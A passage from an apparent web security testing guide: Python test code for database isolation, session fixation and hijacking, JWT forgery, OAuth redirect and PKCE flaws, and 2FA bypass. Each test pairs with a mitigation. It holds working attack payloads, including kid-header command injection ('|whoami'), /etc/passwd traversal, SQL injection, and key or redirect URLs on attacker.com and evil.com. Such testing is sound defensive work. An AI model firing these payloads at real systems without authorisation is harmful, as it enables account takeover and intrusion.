        conn1.commit()
        
        return {
            'test': 'Non-repeatable Read',
            'isolation_level': 'READ COMMITTED',
            'first_read': first_read,
            'second_read': second_read,
            'value_changed': first_read != second_read,
            'risk': 'Same query returns different results in same transaction'
        }
    
    isolation_tests.append(test_non_repeatable_read())
    
    # Test 3: Phantom Read (REPEATABLE READ)
    def test_phantom_read():
        """Can new rows appear between two queries in same transaction?"""
        
        # Transaction 1: Query rows
        conn1 = create_db_connection()
        cursor1 = conn1.cursor()
        cursor1.execute("SET TRANSACTION ISOLATION LEVEL REPEATABLE READ")
        cursor1.execute("BEGIN")
        cursor1.execute("SELECT COUNT(*) FROM accounts WHERE balance > 1000")
        first_count = cursor1.fetchone()[0]
        
        # Transaction 2: Insert new row matching criteria
        conn2 = create_db_connection()
        cursor2 = conn2.cursor()
        cursor2.execute("INSERT INTO accounts (balance) VALUES (2000)")
        conn2.commit()
        
        # Transaction 1: Query again
        cursor1.execute("SELECT COUNT(*) FROM accounts WHERE balance > 1000")
        second_count = cursor1.fetchone()[0]
        conn1.commit()
        
        return {
            'test': 'Phantom Read',
            'isolation_level': 'REPEATABLE READ',
            'first_count': first_count,
            'second_count': second_count,
            'phantom_row_appeared': second_count > first_count,
            'risk': 'New rows appear in repeated query'
        }
    
    isolation_tests.append(test_phantom_read())
    
    # Test 4: Lost Update
    def test_lost_update():
        """Can concurrent updates cause one update to be lost?"""
        
        # Both transactions read initial value
        conn1 = create_db_connection()
        cursor1 = conn1.cursor()
        cursor1.execute("BEGIN")
        cursor1.execute("SELECT balance FROM accounts WHERE id = 1")
        balance1 = cursor1.fetchone()[0]
        
        conn2 = create_db_connection()
        cursor2 = conn2.cursor()
        cursor2.execute("BEGIN")
        cursor2.execute("SELECT balance FROM accounts WHERE id = 1")
        balance2 = cursor2.fetchone()[0]
        
        # Both update based on what they read
        cursor1.execute("UPDATE accounts SET balance = %s WHERE id = 1", (balance1 + 100,))
        cursor2.execute("UPDATE accounts SET balance = %s WHERE id = 1", (balance2 + 200,))
        
        # Commit both
        conn1.commit()
        conn2.commit()
        
        # Check final value
        cursor1.execute("SELECT balance FROM accounts WHERE id = 1")
        final_balance = cursor1.fetchone()[0]
        
        expected = balance1 + 100 + 200
        
        return {
            'test': 'Lost Update',
            'initial_balance': balance1,
            'expected_final': expected,
            'actual_final': final_balance,
            'update_lost': final_balance != expected,
            'mitigation': 'Use SELECT FOR UPDATE or optimistic locking'
        }
    
    isolation_tests.append(test_lost_update())
    
    return {
        'isolation_tests': isolation_tests,
        'recommendation': 'Use SERIALIZABLE for financial transactions, REPEATABLE READ for most cases'
    }

---


## 14. Session & Authentication Attacks (Comprehensive)

### 14.1 Session Fixation Attacks

#### 14.1.1 Pre-Login Session Fixation

```python
def test_session_fixation(target_url):
    """Test for session fixation vulnerabilities"""
    
    tests = []
    
    # Test 1: Session ID accepted from URL parameter
    session_id = 'ATTACKER_CONTROLLED_SESSION_123'
    
    response = requests.get(
        f"{target_url}/login",
        params={'session_id': session_id},
        allow_redirects=False
    )
    
    # Check if server accepts the session ID
    set_cookie = response.headers.get('Set-Cookie', '')
    
    tests.append({
        'test': 'Session fixation via URL parameter',
        'vulnerable': session_id in set_cookie,
        'attack_url': f"{target_url}/login?session_id={session_id}",
        'mitigation': 'Regenerate session ID after login'
    })
    
    # Test 2: Session ID persists after login
    session = requests.Session()
    
    # Get initial session
    session.get(f"{target_url}/")
    initial_cookie = session.cookies.get('PHPSESSID') or session.cookies.get('session_id')
    
    # Log in
    session.post(
        f"{target_url}/login",
        data={'username': 'testuser', 'password': 'password123'}
    )
    
    # Check if session ID changed
    post_login_cookie = session.cookies.get('PHPSESSID') or session.cookies.get('session_id')
    
    tests.append({
        'test': 'Session ID regeneration after login',
        'initial_session': initial_cookie,
        'post_login_session': post_login_cookie,
        'vulnerable': initial_cookie == post_login_cookie,
        'mitigation': 'Call session_regenerate_id() after successful login'
    })
    
    # Test 3: Session fixation via Cookie
    attacker_session = 'FIXED_SESSION_COOKIE'
    
    response = requests.get(
        target_url,
        cookies={'PHPSESSID': attacker_session}
    )
    
    returned_session = response.cookies.get('PHPSESSID')
    
    tests.append({
        'test': 'Session fixation via Cookie injection',
        'vulnerable': returned_session == attacker_session,
        'attacker_session': attacker_session,
        'returned_session': returned_session
    })
    
    # Test 4: Cross-subdomain session fixation
    if '.' in target_url:
        # Try to set session on parent domain
        domain = '.'.join(target_url.split('.')[-2:])  # Extract example.com from www.example.com
        
        response = requests.get(
            target_url,
            cookies={'session_id': attacker_session},
            headers={'Host': f'attacker.{domain}'}
        )
        
        tests.append({
            'test': 'Cross-subdomain session fixation',
            'vulnerable': response.status_code == 200,
            'note': 'Check if session cookies scoped to parent domain'
        })
    
    return {
        'session_fixation_tests': tests,
        'vulnerable': any(t.get('vulnerable', False) for t in tests)
    }

#### 14.1.2 Session Hijacking Techniques

```python
def test_session_hijacking_vectors(target_url):
    """Test various session hijacking attack vectors"""
    
    session_tests = []
    
    # Test 1: Session ID in URL (session exposure via Referer)
    session = requests.Session()
    session.get(f"{target_url}/login")
    
    # Check if session ID is in URL
    response = session.get(f"{target_url}/dashboard")
    
    session_in_url = 'session' in response.url.lower() or 'sid' in response.url.lower()
    
    session_tests.append({
        'test': 'Session ID in URL',
        'vulnerable': session_in_url,
        'risk': 'Session ID leaked via Referer header, browser history, logs',
        'url': response.url,
        'mitigation': 'Always use cookies for session IDs'
    })
    
    # Test 2: Session ID transmitted over HTTP
    http_url = target_url.replace('https://', 'http://')
    
    try:
        response = requests.get(http_url, allow_redirects=False)
        session_over_http = response.status_code == 200 and 'Set-Cookie' in response.headers
        
        session_tests.append({
            'test': 'Session transmitted over HTTP',
            'vulnerable': session_over_http,
            'risk': 'Session ID intercepted in plaintext',
            'mitigation': 'Enforce HTTPS; use Secure cookie flag'
        })
    except:
        session_tests.append({
            'test': 'Session transmitted over HTTP',
            'vulnerable': False,
            'note': 'HTTP not accessible'
        })
    
    # Test 3: Session cookie without Secure flag
    response = requests.get(target_url)
    set_cookie = response.headers.get('Set-Cookie', '')
    
    has_secure_flag = 'Secure' in set_cookie
    
    session_tests.append({
        'test': 'Secure cookie flag',
        'vulnerable': not has_secure_flag,
        'risk': 'Cookie can be transmitted over HTTP',
        'set_cookie_header': set_cookie,
        'mitigation': 'Add Secure flag to session cookies'
    })
    
    # Test 4: Session cookie without HttpOnly flag
    has_httponly_flag = 'HttpOnly' in set_cookie
    
    session_tests.append({
        'test': 'HttpOnly cookie flag',
        'vulnerable': not has_httponly_flag,
        'risk': 'Cookie accessible via JavaScript (XSS → session theft)',
        'set_cookie_header': set_cookie,
        'mitigation': 'Add HttpOnly flag to session cookies'
    })
    
    # Test 5: Session cookie with overly broad domain
    import re
    domain_match = re.search(r'Domain=([^;]+)', set_cookie)
    
    if domain_match:
        cookie_domain = domain_match.group(1)
        session_tests.append({
            'test': 'Cookie domain scope',
            'cookie_domain': cookie_domain,
            'vulnerable': cookie_domain.count('.') <= 1,  # e.g., Domain=.com
            'risk': 'Cookie sent to all subdomains',
            'mitigation': 'Set domain to specific subdomain'
        })
    
    # Test 6: Long session timeout
    session = requests.Session()
    response = session.post(
        f"{target_url}/login",
        data={'username': 'test', 'password': 'test'}
    )
    
    # Wait and check if session still valid
    time.sleep(5)
    response = session.get(f"{target_url}/dashboard")
    
    session_tests.append({
        'test': 'Session timeout',
        'check': 'Monitor session expiration time',
        'recommendation': '15-30 minutes for sensitive applications'
    })
    
    # Test 7: Session predictability
    sessions = []
    for _ in range(10):
        response = requests.get(target_url)
        session_id = response.cookies.get('session_id') or response.cookies.get('PHPSESSID')
        if session_id:
            sessions.append(session_id)
    
    # Analyze entropy
    unique_chars = set(''.join(sessions))
    
    session_tests.append({
        'test': 'Session ID randomness',
        'samples': len(sessions),
        'unique_characters': len(unique_chars),
        'vulnerable': len(unique_chars) < 16,
        'sessions_sample': sessions[:3],
        'note': 'Session IDs should be cryptographically random'
    })
    
    # Test 8: Concurrent session limit
    session1 = requests.Session()
    session2 = requests.Session()
    
    # Log in twice with same credentials
    session1.post(f"{target_url}/login", data={'username': 'test', 'password': 'test'})
    session2.post(f"{target_url}/login", data={'username': 'test', 'password': 'test'})
    
    # Check if both sessions are valid
    response1 = session1.get(f"{target_url}/dashboard")
    response2 = session2.get(f"{target_url}/dashboard")
    
    session_tests.append({
        'test': 'Concurrent session limit',
        'both_sessions_valid': response1.status_code == 200 and response2.status_code == 200,
        'recommendation': 'Limit to 1-3 concurrent sessions per user',
        'note': 'Prevents session sharing and credential theft'
    })
    
    return {
        'session_hijacking_tests': session_tests,
        'critical_vulnerabilities': sum(1 for t in session_tests if t.get('vulnerable', False))
    }

### 14.2 JWT (JSON Web Token) Attack Testing

#### 14.2.1 Comprehensive JWT Vulnerability Testing

```python
import jwt
import base64
import json
import hmac
import hashlib

class ComprehensiveJWTTester:
    """Exhaustive JWT vulnerability testing"""
    
    def __init__(self, token, api_endpoint):
        self.token = token
        self.api_endpoint = api_endpoint
        self.header, self.payload, self.signature = self.parse_jwt(token)
    
    def parse_jwt(self, token):
        """Parse JWT into components"""
        try:
            parts = token.split('.')
            
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            signature = parts[2]
            
            return header, payload, signature
        except Exception as e:
            return None, None, None
    
    def test_none_algorithm_bypass(self):
        """Test 'none' algorithm vulnerability"""
        
        # Create token with alg: none
        modified_header = {**self.header, 'alg': 'none'}
        
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(modified_header).encode()
        ).decode().rstrip('=')
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(self.payload).encode()
        ).decode().rstrip('=')
        
        # Try various none algorithm formats
        none_tokens = [
            f"{header_b64}.{payload_b64}.",
            f"{header_b64}.{payload_b64}",
            f"{header_b64}.{payload_b64}.{self.signature}",  # Keep original signature
        ]
        
        results = []
        
        for token in none_tokens:
            response = requests.get(
                self.api_endpoint,
                headers={'Authorization': f'Bearer {token}'}
            )
            
            results.append({
                'token_format': token[:50] + '...',
                'accepted': response.status_code == 200,
                'status': response.status_code
            })
        
        return {
            'test': 'None algorithm bypass',
            'results': results,
            'vulnerable': any(r['accepted'] for r in results),
            'mitigation': 'Explicitly reject alg: none; whitelist allowed algorithms'
        }
    
    def test_algorithm_confusion(self):
        """Test RS256 to HS256 algorithm confusion"""
        
        # This attack works when:
        # 1. Server expects RS256 (asymmetric)
        # 2. Attacker changes alg to HS256 (symmetric)
        # 3. Attacker signs with public key as HMAC secret
        
        modified_header = {**self.header, 'alg': 'HS256'}
        
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(modified_header, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(self.payload, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        # In real attack, would sign with public key
        # This example demonstrates the concept
        
        return {
            'test': 'Algorithm confusion (RS256 → HS256)',
            'attack_theory': 'Use RSA public key as HMAC secret',
            'preconditions': [
                'Server uses RS256 for signature verification',
                'Public key is accessible',
                'Server doesn\'t validate algorithm strictly'
            ],
            'mitigation': [
                'Explicitly specify expected algorithm',
                'Use algorithm whitelist',
                'Never allow alg header to override server config'
            ]
        }
    
    def test_weak_secret_brute_force(self):
        """Test JWT signed with weak secret"""
        
        common_secrets = [
            'secret',
            'password',
            '123456',
            'qwerty',
            'secret123',
            'mysecret',
            'jwtsecret',
            'your-256-bit-secret',
            'ChangeMe',
        ]
        
        # Extract signature from token
        unsigned_token = '.'.join(self.token.split('.')[:2])
        actual_signature = self.token.split('.')[2]
        
        cracked = False
        found_secret = None
        
        for secret in common_secrets:
            # Generate signature with this secret
            test_signature = base64.urlsafe_b64encode(
                hmac.new(
                    secret.encode(),
                    unsigned_token.encode(),
                    hashlib.sha256
                ).digest()
            ).decode().rstrip('=')
            
            if test_signature == actual_signature:
                cracked = True
                found_secret = secret
                break
        
        return {
            'test': 'Weak secret brute force',
            'secrets_tested': len(common_secrets),
            'cracked': cracked,
            'secret': found_secret if cracked else None,
            'mitigation': 'Use strong, random secret (256+ bits)'
        }
    
    def test_kid_header_injection(self):
        """Test key ID (kid) header injection"""
        
        # Various kid injection attacks
        kid_payloads = [
            '/dev/null',  # Empty key file
            '../../public.pem',  # Path traversal to public key
            'http://evil.com/malicious.key',  # Remote key loading
            '|whoami',  # Command injection
            '../../../etc/passwd',  # File read
            'key\"; DROP TABLE users--',  # SQL injection if kid used in query
        ]
        
        results = []
        
        for kid in kid_payloads:
            modified_header = {**self.header, 'kid': kid}
            
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(modified_header).encode()
            ).decode().rstrip('=')
            
            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(self.payload).encode()
            ).decode().rstrip('=')
            
            malicious_token = f"{header_b64}.{payload_b64}.{self.signature}"
            
            response = requests.get(
                self.api_endpoint,
                headers={'Authorization': f'Bearer {malicious_token}'}
            )
            
            results.append({
                'kid_payload': kid,
                'status': response.status_code,
                'accepted': response.status_code == 200,
                'response_size': len(response.text)
            })
        
        return {
            'test': 'KID header injection',
            'results': results,
            'vulnerable': any(r['accepted'] for r in results),
            'mitigation': 'Whitelist allowed kid values; validate path; never execute kid'
        }
    
    def test_jku_header_injection(self):
        """Test JWK Set URL (jku) header injection"""
        
        # Attacker-controlled JWK set URL
        malicious_jku_urls = [
            'http://attacker.com/jwks.json',
            'https://attacker.com/malicious_keys',
            'file:///etc/passwd',
        ]
        
        results = []
        
        for jku_url in malicious_jku_urls:
            modified_header = {**self.header, 'jku': jku_url}
            
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(modified_header).encode()
            ).decode().rstrip('=')
            
            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(self.payload).encode()
            ).decode().rstrip('=')
            
            # Sign with attacker's private key
            malicious_token = f"{header_b64}.{payload_b64}.ATTACKER_SIGNATURE"
            
            results.append({
                'jku_url': jku_url,
                'attack': 'Server fetches keys from attacker-controlled URL',
                'risk': 'Attacker provides matching public key for their private key'
            })
        
        return {
            'test': 'JKU header injection',
            'results': results,
            'mitigation': [
                'Never fetch keys from untrusted URLs',
                'Whitelist allowed JKU URLs',
                'Disable jku header entirely if not needed'
            ]
        }
    
    def test_jwk_header_injection(self):
        """Test embedded JWK header injection"""
        
        # Attacker embeds their own public key in token
        attacker_jwk = {
            "kty": "RSA",
            "kid": "attacker-key",
            "use": "sig",
            "n": "ATTACKER_PUBLIC_KEY_MODULUS",
            "e": "AQAB"
        }
        
        modified_header = {**self.header, 'jwk': attacker_jwk}
        
        return {
            'test': 'JWK header injection',
            'attack': 'Embed attacker public key in token header',
            'modified_header': modified_header,
            'risk': 'If server uses embedded JWK, attacker can sign with their key',
            'mitigation': 'Never trust JWK from token header; use server-side key store'
        }
    
    def test_payload_manipulation(self):
        """Test various payload manipulation attacks"""
        
        # Privilege escalation attempts
        escalation_payloads = [
            {**self.payload, 'role': 'admin'},
            {**self.payload, 'is_admin': True},
            {**self.payload, 'permissions': ['*']},
            {**self.payload, 'user_id': 1},  # Become user 1 (often admin)
            {**self.payload, 'sub': 'admin'},
        ]
        
        results = []
        
        for payload in escalation_payloads:
            # Encode modified payload
            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip('=')
            
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(self.header).encode()
            ).decode().rstrip('=')
            
            # Keep original signature (will be invalid)
            tampered_token = f"{header_b64}.{payload_b64}.{self.signature}"
            
            response = requests.get(
                self.api_endpoint,
                headers={'Authorization': f'Bearer {tampered_token}'}
            )
            
            results.append({
                'modification': payload,
                'accepted': response.status_code == 200,
                'status': response.status_code
            })
        
        return {
            'test': 'Payload manipulation',
            'results': results,
            'vulnerable': any(r['accepted'] for r in results),
            'note': 'Tokens should be rejected with invalid signature'
        }
    
    def test_expiry_bypass(self):
        """Test expiry (exp) claim bypass"""
        
        expiry_bypass_attempts = [
            {'exp': None},  # Remove expiry
            {'exp': ''},  # Empty string
            {'exp': 9999999999},  # Far future
            {'exp': -1},  # Negative (might wrap around)
            {'exp': '2099-12-31'},  # String instead of timestamp
        ]
        
        results = []
        
        for bypass in expiry_bypass_attempts:
            modified_payload = {k: v for k, v in self.payload.items() if k != 'exp'}
            modified_payload.update(bypass)
            
            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(modified_payload).encode()
            ).decode().rstrip('=')
            
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(self.header).encode()
            ).decode().rstrip('=')
            
            token = f"{header_b64}.{payload_b64}.{self.signature}"
            
            response = requests.get(
                self.api_endpoint,
                headers={'Authorization': f'Bearer {token}'}
            )
            
            results.append({
                'bypass_attempt': bypass,
                'accepted': response.status_code == 200
            })
        
        return {
            'test': 'Expiry bypass',
            'results': results,
            'vulnerable': any(r['accepted'] for r in results),
            'mitigation': 'Always validate exp claim; reject missing/invalid exp'
        }
    
    def test_audience_claim_bypass(self):
        """Test audience (aud) claim validation"""
        
        # Token intended for different service
        modified_payloads = [
            {**self.payload, 'aud': 'different-service'},
            {**self.payload, 'aud': ['service1', 'service2']},
            {k: v for k, v in self.payload.items() if k != 'aud'},  # Remove aud
        ]
        
        results = []
        
        for payload in modified_payloads:
            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip('=')
            
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(self.header).encode()
            ).decode().rstrip('=')
            
            token = f"{header_b64}.{payload_b64}.{self.signature}"
            
            response = requests.get(
                self.api_endpoint,
                headers={'Authorization': f'Bearer {token}'}
            )
            
            results.append({
                'payload': payload,
                'accepted': response.status_code == 200
            })
        
        return {
            'test': 'Audience claim bypass',
            'results': results,
            'vulnerable': any(r['accepted'] for r in results),
            'mitigation': 'Always validate aud claim matches expected audience'
        }
    
    def run_all_tests(self):
        """Run all JWT vulnerability tests"""
        
        all_tests = {
            'none_algorithm': self.test_none_algorithm_bypass(),
            'algorithm_confusion': self.test_algorithm_confusion(),
            'weak_secret': self.test_weak_secret_brute_force(),
            'kid_injection': self.test_kid_header_injection(),
            'jku_injection': self.test_jku_header_injection(),
            'jwk_injection': self.test_jwk_header_injection(),
            'payload_manipulation': self.test_payload_manipulation(),
            'expiry_bypass': self.test_expiry_bypass(),
            'audience_bypass': self.test_audience_claim_bypass()
        }
        
        vulnerabilities_found = sum(
            1 for test in all_tests.values()
            if test.get('vulnerable', False)
        )
        
        return {
            'token_analyzed': self.token[:50] + '...',
            'header': self.header,
            'payload': self.payload,
            'tests_performed': len(all_tests),
            'vulnerabilities_found': vulnerabilities_found,
            'detailed_results': all_tests
        }

### 14.3 OAuth 2.0 Attack Testing

#### 14.3.1 OAuth Authorization Code Flow Attacks

```python
def test_oauth_authorization_code_attacks(oauth_config):
    """Test OAuth 2.0 authorization code flow vulnerabilities"""
    
    tests = []
    
    # Test 1: Missing state parameter (CSRF)
    auth_url_no_state = (
        f"{oauth_config['authorization_endpoint']}?"
        f"client_id={oauth_config['client_id']}&"
        f"redirect_uri={oauth_config['redirect_uri']}&"
        f"response_type=code&"
        f"scope=read"
    )
    
    response = requests.get(auth_url_no_state, allow_redirects=False)
    
    tests.append({
        'test': 'Missing state parameter (CSRF vulnerability)',
        'auth_url': auth_url_no_state,
        'accepted': response.status_code in [200, 302],
        'vulnerable': response.status_code in [200, 302],
        'attack': 'Attacker can trick victim into authorizing attacker\'s app',
        'mitigation': 'Require state parameter; validate state matches'
    })
    
    # Test 2: Redirect URI manipulation
    redirect_uri_attacks = [
        f"https://attacker.com",
        f"https://{oauth_config['client_domain']}@attacker.com",
        f"https://{oauth_config['client_domain']}.attacker.com",
        f"https://{oauth_config['client_domain']}%252F@attacker.com",  # Double encoding
        f"{oauth_config['redirect_uri']}/../../../attacker.com",
        f"{oauth_config['redirect_uri']}?redirect=https://attacker.com",
    ]
    
    for redirect_uri in redirect_uri_attacks:
        auth_url = (
            f"{oauth_config['authorization_endpoint']}?"
            f"client_id={oauth_config['client_id']}&"
            f"redirect_uri={redirect_uri}&"
            f"response_type=code&"
            f"state=test"
        )
        
        response = requests.get(auth_url, allow_redirects=False)
        
        # Check if redirected to attacker.com
        location = response.headers.get('Location', '')
        
        tests.append({
            'test': 'Redirect URI manipulation',
            'redirect_uri': redirect_uri,
            'status': response.status_code,
            'vulnerable': 'attacker.com' in location,
            'location': location
        })
    
    # Test 3: Authorization code interception
    tests.append({
        'test': 'Authorization code interception',
        'attack_scenario': [
            'Attacker intercepts authorization code from redirect',
            'Attacker exchanges code for access token',
            'Attacker accesses victim\'s account'
        ],
        'preconditions': [
            'Redirect URI uses HTTP (not HTTPS)',
            'Or attacker controls network (MITM)',
            'No PKCE (Proof Key for Code Exchange)'
        ],
        'mitigation': [
            'Enforce HTTPS for redirect URIs',
            'Implement PKCE',
            'Short-lived authorization codes (60 seconds)',
            'One-time use codes'
        ]
    })
    
    # Test 4: Authorization code replay
    # This would require:
    # 1. Obtaining a valid authorization code
    # 2. Exchanging it for token
    # 3. Trying to exchange it again
    
    tests.append({
        'test': 'Authorization code replay',
        'check': 'Can same authorization code be used twice?',
        'procedure': [
            'Complete OAuth flow, get auth code',
            'Exchange code for access token',
            'Try to exchange same code again'
        ],
        'vulnerable_if': 'Second exchange succeeds',
        'mitigation': 'Invalidate code after first use'
    })
    
    # Test 5: Client secret exposure
    tests.append({
        'test': 'Client secret in public client',
        'client_type': oauth_config.get('client_type'),
        'has_secret': 'client_secret' in oauth_config,
        'vulnerable': (
            oauth_config.get('client_type') in ['spa', 'mobile', 'public'] and
            'client_secret' in oauth_config
        ),
        'issue': 'Public clients (SPA, mobile) cannot securely store secrets',
        'mitigation': 'Use PKCE instead of client secret for public clients'
    })
    
    # Test 6: Scope escalation
    requested_scope = 'read'
    escalated_scope = 'read write admin'
    
    auth_url = (
        f"{oauth_config['authorization_endpoint']}?"
        f"client_id={oauth_config['client_id']}&"
        f"redirect_uri={oauth_config['redirect_uri']}&"
        f"response_type=code&"
        f"scope={escalated_scope}&"
        f"state=test"
    )
    
    response = requests.get(auth_url, allow_redirects=False)
    
    tests.append({
        'test': 'Scope escalation',
        'requested_scope': escalated_scope,
        'expected_scope': requested_scope,
        'check': 'Does server grant excessive scopes?',
        'mitigation': 'Whitelist allowed scopes per client'
    })
    
    # Test 7: Token in URL fragment (implicit flow issues)
    implicit_flow_url = (
        f"{oauth_config['authorization_endpoint']}?"
        f"client_id={oauth_config['client_id']}&"
        f"redirect_uri={oauth_config['redirect_uri']}&"
        f"response_type=token&"  # Implicit flow
        f"state=test"
    )
    
    tests.append({
        'test': 'Implicit flow (deprecated)',
        'auth_url': implicit_flow_url,
        'issue': 'Access token exposed in URL fragment',
        'risks': [
            'Token leaked via Referer header',
            'Token in browser history',
            'Token in server logs',
            'XSS can steal token'
        ],
        'mitigation': 'Use authorization code flow with PKCE instead'
    })
    
    return {
        'oauth_authorization_tests': tests,
        'critical_issues': sum(1 for t in tests if t.get('vulnerable', False))
    }

#### 14.3.2 PKCE Implementation Testing

```python
def test_pkce_implementation(oauth_config):
    """Test Proof Key for Code Exchange (PKCE) implementation"""
    
    import hashlib
    import secrets
    
    tests = []
    
    # Generate code verifier and challenge
    code_verifier = base64.urlsafe_b64encode(secrets.token_bytes(32)).decode().rstrip('=')
    
    # S256 challenge method
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode()).digest()
    ).decode().rstrip('=')
    
    # Test 1: PKCE supported
    auth_url_with_pkce = (
        f"{oauth_config['authorization_endpoint']}?"
        f"client_id={oauth_config['client_id']}&"
        f"redirect_uri={oauth_config['redirect_uri']}&"
        f"response_type=code&"
        f"code_challenge={code_challenge}&"
        f"code_challenge_method=S256&"
        f"state=test"
    )
    
    response = requests.get(auth_url_with_pkce, allow_redirects=False)
    
    tests.append({
        'test': 'PKCE supported',
        'pkce_accepted': response.status_code in [200, 302],
        'status': response.status_code,
        'note': 'PKCE should be required for public clients'
    })
    
    # Test 2: PKCE required (not optional)
    auth_url_no_pkce = (
        f"{oauth_config['authorization_endpoint']}?"
        f"client_id={oauth_config['client_id']}&"
        f"redirect_uri={oauth_config['redirect_uri']}&"
        f"response_type=code&"
        f"state=test"
    )
    
    response = requests.get(auth_url_no_pkce, allow_redirects=False)
    
    tests.append({
        'test': 'PKCE required',
        'no_pkce_accepted': response.status_code in [200, 302],
        'vulnerable': response.status_code in [200, 302],
        'issue': 'PKCE should be required for public clients',
        'status': response.status_code
    })
    
    # Test 3: Plain challenge method rejected
    auth_url_plain = (
        f"{oauth_config['authorization_endpoint']}?"
        f"client_id={oauth_config['client_id']}&"
        f"redirect_uri={oauth_config['redirect_uri']}&"
        f"response_type=code&"
        f"code_challenge={code_verifier}&"  # Plain, not hashed
        f"code_challenge_method=plain&"
        f"state=test"
    )
    
    response = requests.get(auth_url_plain, allow_redirects=False)
    
    tests.append({
        'test': 'Plain challenge method',
        'plain_accepted': response.status_code in [200, 302],
        'vulnerable': response.status_code in [200, 302],
        'issue': 'Plain method is less secure; should require S256',
        'mitigation': 'Only accept code_challenge_method=S256'
    })
    
    # Test 4: Code verifier validation
    # This test requires completing the full OAuth flow
    tests.append({
        'test': 'Code verifier validation',
        'procedure': [
            '1. Initiate auth with code_challenge',
            '2. Get authorization code',
            '3. Exchange code with wrong code_verifier',
            '4. Should be rejected'
        ],
        'check': 'Does server validate code_verifier matches code_challenge?',
        'vulnerable_if': 'Wrong code_verifier accepted'
    })
    
    # Test 5: Code verifier length
    short_verifier = 'short'
    long_verifier = 'a' * 200
    
    for verifier, name in [(short_verifier, 'too_short'), (long_verifier, 'too_long')]:
        challenge = base64.urlsafe_b64encode(
            hashlib.sha256(verifier.encode()).digest()
        ).decode().rstrip('=')
        
        auth_url = (
            f"{oauth_config['authorization_endpoint']}?"
            f"client_id={oauth_config['client_id']}&"
            f"redirect_uri={oauth_config['redirect_uri']}&"
            f"response_type=code&"
            f"code_challenge={challenge}&"
            f"code_challenge_method=S256&"
            f"state=test"
        )
        
        response = requests.get(auth_url, allow_redirects=False)
        
        tests.append({
            'test': f'Code verifier length: {name}',
            'verifier_length': len(verifier),
            'accepted': response.status_code in [200, 302],
            'note': 'Verifier should be 43-128 characters'
        })
    
    return {
        'pkce_tests': tests,
        'pkce_implemented': any(t.get('pkce_accepted') for t in tests),
        'issues_found': sum(1 for t in tests if t.get('vulnerable', False))
    }

### 14.4 Two-Factor Authentication (2FA) Bypass Testing

```python
def test_2fa_bypass_techniques(app_url, credentials):
    """Test various 2FA bypass techniques"""
    
    bypass_tests = []
    
    # Test 1: Direct endpoint access (skip 2FA page)
    session = requests.Session()
    
    # Login with username/password
    session.post(
        f"{app_url}/login",
        data={'username': credentials['username'], 'password': credentials['password']}
    )
    
    # Try to access protected page directly without completing 2FA
    response = session.get(f"{app_url}/dashboard")
    
    bypass_tests.append({
        'test': 'Direct endpoint access (skip 2FA)',
        'bypassed': response.status_code == 200 and '2fa' not in response.url.lower(),
        'status': response.status_code,
        'url': response.url,
        'mitigation': 'Check 2FA completion status on all protected pages'
    })
    
    # Test 2: Response manipulation
    # Submit wrong 2FA code but manipulate response
    response = session.post(
        f"{app_url}/2fa/verify",
        data={'code': '000000'}  # Wrong code
    )
    
    bypass_tests.append({
        'test': 'Client-side 2FA validation',
        'check': 'Is 2FA validated only client-side?',
        'attack': 'Modify JavaScript or response to bypass check',
        'mitigation': 'Always validate 2FA server-side'
    })
    
    # Test 3: Code reuse
    # Use the same 2FA code multiple times
    valid_code = '123456'  # In real test, would need actual valid code
    
    responses = []
    for _ in range(3):
        response = session.post(
            f"{app_url}/2fa/verify",
            data={'code': valid_code}
        )
        responses.append(response.status_code)
    
    bypass_tests.append({
        'test': '2FA code reuse',
        'attempts': 3,
        'responses': responses,
        'vulnerable': responses.count(200) > 1,
        'mitigation': 'Invalidate 2FA code after first use'
    })
    
    # Test 4: Brute force 2FA code
    # Try all possible 6-digit codes
    bypass_tests.append({
        'test': '2FA brute force',
        'attack': 'Try all 000000-999999 (1 million combinations)',
        'rate_limiting_required': True,
        'account_lockout_required': True,
        'time_to_crack': '1M codes / rate_limit = time',
        'example': 'If 1 attempt/sec allowed, takes 11.5 days',
        'mitigation': [
            'Rate limit: max 5 attempts per 15 minutes',
            'Account lockout after 10 failed attempts',
            'CAPTCHA after 3 failed attempts',
            'Alert user of failed 2FA attempts'
        ]
    })
    
    # Test 5: Backup codes bypass
    bypass_tests.append({
        'test': 'Backup codes security',
        'checks': [
            'Are backup codes one-time use?',
            'Are backup codes invalidated on password change?',
            'Is there a limit on backup codes?',
            'Can user generate unlimited backup codes?'
        ],
        'attack': 'Generate many backup codes, use for persistent access'
    })
    
    # Test 6: Remember this device bypass
    session = requests.Session()
    session.post(f"{app_url}/login", data=credentials)
    
    # Complete 2FA with "remember this device" checked
    response = session.post(
        f"{app_url}/2fa/verify",
        data={'code': '123456', 'remember_device': 'true'}
    )
    
    # Check cookie or token set
    remember_token = session.cookies.get('remember_2fa') or session.cookies.get('device_token')
    
    bypass_tests.append({
        'test': 'Remember this device',
        'token_set': remember_token is not None,
        'token_value': remember_token,
        'checks': [
            'Is token cryptographically random?',
            'Does token expire?',
            'Is token invalidated on password change?',
            'Is token bound to specific device?'
        ],
        'attack': 'Steal remember_device token for persistent bypass'
    })
    
    # Test 7: 2FA not enforced for API
    api_response = session.post(
        f"{app_url}/api/profile",
        headers={'Authorization': f'Bearer {session.cookies.get("auth_token")}'}
    )
    
    bypass_tests.append({
        'test': '2FA enforcement on API',
        'api_status': api_response.status_code,
        'vulnerable': api_response.status_code == 200,
        'issue': 'API bypasses 2FA if only enforced on web interface',
